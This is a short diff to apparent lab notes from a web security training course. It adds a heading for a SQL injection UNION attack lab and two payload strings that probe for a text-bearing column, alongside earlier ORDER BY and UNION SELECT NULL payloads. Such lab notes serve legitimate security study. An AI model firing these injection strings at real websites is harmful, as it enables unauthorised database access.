@@ -77,10 +77,10 @@ order by 3--
 ```sh
 'union select null,null,null--
 ```
-###
+### Lab8: SQL injection UNION attack, finding a column containing text
 ```sh
-
+'+UNION+SELECT+NULL,'a',NULL--
 ```
 ```sh
-
+'+UNION+SELECT+NULL,'273Yf9bW',NULL--
 ```
